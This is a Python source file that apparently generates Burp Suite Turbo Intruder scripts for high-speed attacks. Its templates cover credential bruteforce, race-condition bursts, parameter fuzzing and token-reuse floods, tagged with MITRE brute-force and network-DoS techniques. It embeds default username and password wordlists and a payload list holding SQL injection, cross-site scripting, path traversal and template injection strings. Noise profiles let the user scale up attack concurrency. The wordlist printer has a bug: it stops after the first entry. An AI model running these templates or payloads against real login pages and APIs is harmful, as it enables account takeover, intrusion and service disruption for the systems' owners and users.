#!/usr/bin/env python3
"""
turbo-intruder-automation/scripts/agent.py
Turbo Intruder Script Generator — generates high-speed bruteforce scripts for Burp Suite.
MITRE ATT&CK: T1110 (Brute Force), T1498 (Network DoS)
"""
import argparse, json, os, re, signal, sys, textwrap
try:
    from colorama import Fore, Style, init; init(autoreset=True)
except ImportError:
    class Fore: RED=GREEN=YELLOW=CYAN=MAGENTA=WHITE=RESET=""
    class Style: BRIGHT=DIM=NORMAL=RESET_ALL=""
    class init: autoreset=lambda: None
active = True
results_cache = {"mode": "", "params": {}}


def signal_handler(sig, frame):
    global active
    if active:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        active = False
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

RATE_FLAGS = {
"quiet": {"concurrency_scale": 0.1},
"moderate": {"concurrency_scale": 1.0},
"loud": {"concurrency_scale": 2.0},
}
def _rate_flags(profile="moderate"):
    return RATE_FLAGS.get(profile, RATE_FLAGS["moderate"])

TPL = {
"bruteforce":{"desc":"Credential bruteforce with wordlists","p":{"target_url":"https://x.com/login","concurrency":20,"per_connection":10,"retries":2,"username_param":"username","password_param":"password","user_wordlist":"usernames","pass_wordlist":"passwords"},
"c":"""def queueRequests(target,wordlists):
 engine=RequestEngine(endpoint=target.endpoint,concurrentConnections={concurrency},requestsPerConnection={per_connection},pipeline=False,maxRetriesPerRequest={retries})
 for u in wordlists["{user_wordlist}"]:
  for p in wordlists["{pass_wordlist}"]: engine.queue(target.req,[{username_param!r},{password_param!r},u.rstrip(),p.rstrip()])
def handleResponse(req,interesting):
 if "login failed" not in req.response.lower() and req.response.status_code!=401: table.add(req)
"""},
"race_condition":{"desc":"Race condition — parallel request burst","p":{"target_url":"https://x.com/go","concurrency":30,"race_count":20,"param_value":"race_test"},
"c":"""def queueRequests(target,wordlists):
 engine=RequestEngine(endpoint=target.endpoint,concurrentConnections={concurrency},requestsPerConnection=1,pipeline=False,maxRetriesPerRequest=0)
 for i in range({race_count}): engine.queue(target.req,[{param_value!r},])
def handleResponse(req,interesting):
 if req.response.status_code==200: table.add(req)
"""},
"pitchfork":{"desc":"Pitchfork — paired values","p":{"target_url":"https://x.com/api","concurrency":10,"per_connection":5,"retries":1,"param1":"user_id","param2":"token","wordlist1":"ids","wordlist2":"tokens"},
"c":"""def queueRequests(target,wordlists):
 engine=RequestEngine(endpoint=target.endpoint,concurrentConnections={concurrency},requestsPerConnection={per_connection},pipeline=False,maxRetriesPerRequest={retries})
 for i in range(min(len(wordlists["{wordlist1}"]),len(wordlists["{wordlist2}"]))):
  v1=wordlists["{wordlist1}"][i].rstrip();v2=wordlists["{wordlist2}"][i].rstrip()
  engine.queue(target.req,[{param1!r},{param2!r},v1,v2])
def handleResponse(req,interesting):
 if req.response.status_code not in (404,403): table.add(req)
"""},
"sniper":{"desc":"Sniper — one param, many values","p":{"target_url":"https://x.com/search","concurrency":15,"per_connection":5,"retries":1,"param_name":"q","wordlist":"payloads","interesting_codes":"200,301,302,401,403,500"},
"c":"""def queueRequests(target,wordlists):
 engine=RequestEngine(endpoint=target.endpoint,concurrentConnections={concurrency},requestsPerConnection={per_connection},pipeline=False,maxRetriesPerRequest={retries})
 for w in wordlists["{wordlist}"]: engine.queue(target.req,[{param_name!r},w.rstrip()])
def handleResponse(req,interesting):
 if req.response.status_code in ({interesting_codes}): table.add(req)
"""},
"token_reuse":{"desc":"Token reuse / session race","p":{"target_url":"https://x.com/api/resource","concurrency":50,"request_count":100,"token_param":"Authorization","token_value":"Bearer xxx"},
"c":"""def queueRequests(target,wordlists):
 engine=RequestEngine(endpoint=target.endpoint,concurrentConnections={concurrency},requestsPerConnection=1,pipeline=False,maxRetriesPerRequest=0)
 t="{token_value}"
 for i in range({request_count}): engine.queue(target.req,[{token_param!r},t])
def handleResponse(req,interesting):
 if req.response.status_code in (200,201): table.add(req)
"""},
}

def list_modes():
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n{Fore.WHITE}{Style.BRIGHT} Turbo Intruder Modes{Style.RESET_ALL}\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    for mid,t in TPL.items():
        print(f"\n  {Fore.GREEN}{mid}{Style.RESET_ALL}\n    {t['desc']}")
        for pn,pv in t["p"].items(): print(f"      --param {pn}={pv}")
    print()

def generate(mode,params,profile="moderate"):
    t=TPL[mode];m={}
    scale=_rate_flags(profile)["concurrency_scale"]
    for pn,pv in t["p"].items():
        if pn=="concurrency" and "concurrency" not in params:
            pv=max(1,int(pv*scale))
        m[pn]=params.get(pn,pv)
    return textwrap.dedent(t["c"].format(**m)).lstrip()

def gen_wordlist(t,c=20):
    ws={"usernames":["admin","root","user","test","guest","sa","oracle","manager","admin1","admin2","administrator","backup","support","info","api","dev","jenkins","deploy","service","testuser"],"passwords":["password","123456","admin","Password1","passw0rd","qwerty","letmein","welcome","monkey","sunshine","princess","football","shadow","master","superman","batman","trustno1","jordan","hunter","pass123"],"payloads":["' OR '1'='1","' UNION SELECT 1--","<script>alert(1)</script>","../../etc/passwd","{{7*7}}","${7*7}","1;SELECT 1","../boot.ini","%00","admin'--"],"ids":["1","2","3","4","5","10","100","1000","admin","0000","0","-1","null","undefined"],"tokens":["token_a","token_b","token_c","token_d","token_e","token_f","token_g","token_h","token_i","token_j"]}
    return ws.get(t,ws["payloads"])[:c]

def main():
    p=argparse.ArgumentParser(description="Turbo Intruder Script Generator")
    p.add_argument("mode",nargs="?",default="list"); p.add_argument("--param","-p",action="append",default=[],dest="params"); p.add_argument("--output","-o"); p.add_argument("--wordlist-type"); p.add_argument("--wordlist-count",type=int,default=20); p.add_argument("--dump",action="store_true")
    noise=p.add_mutually_exclusive_group()
    noise.add_argument("--quiet",dest="profile",action="store_const",const="quiet",help="Low-noise: scales engine concurrency down (e.g. 20 -> 2)")
    noise.add_argument("--moderate",dest="profile",action="store_const",const="moderate",help="Moderate noise: engine concurrency unchanged (default)")
    noise.add_argument("--loud",dest="profile",action="store_const",const="loud",help="High-noise: scales engine concurrency up (e.g. 20 -> 40)")
    p.set_defaults(profile="moderate")
    a=p.parse_args()
    if a.wordlist_type:
        w=gen_wordlist(a.wordlist_type,a.wordlist_count)
        print(f"\n{Fore.CYAN}Wordlist ({a.wordlist_type}):{Style.RESET_ALL}")
        for x in w: print(f"  {x}"); return
    if a.mode=="list": list_modes(); return
    if a.mode not in TPL: print(f"{Fore.RED}[!] Unknown{Style.RESET_ALL}"); list_modes(); sys.exit(1)
    params={}
    for pa in a.params:
        if "=" in pa: k,v=pa.split("=",1); params[k.strip()]=v.strip()
    code=generate(a.mode,params,profile=a.profile)
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n{Fore.WHITE}{Style.BRIGHT} {a.mode}.py{Style.RESET_ALL}\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n{code}")
    if a.output:
        with open(a.output,"w") as f: f.write(code)
        print(f"{Fore.GREEN}[+] {a.output}{Style.RESET_ALL}")
    if a.dump: print(json.dumps({"mode":a.mode,"code":code}))

if __name__ == "__main__":
    main()
